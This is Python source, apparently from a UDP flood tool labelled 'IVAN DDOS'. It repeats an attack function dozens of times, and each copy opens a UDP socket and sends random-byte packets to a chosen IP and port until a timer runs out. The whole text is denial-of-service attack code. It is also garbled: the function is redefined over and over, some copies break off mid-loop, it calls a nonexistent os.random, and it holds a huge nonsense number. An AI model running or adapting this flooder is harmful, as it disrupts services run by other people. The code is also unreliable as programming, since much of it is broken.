    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
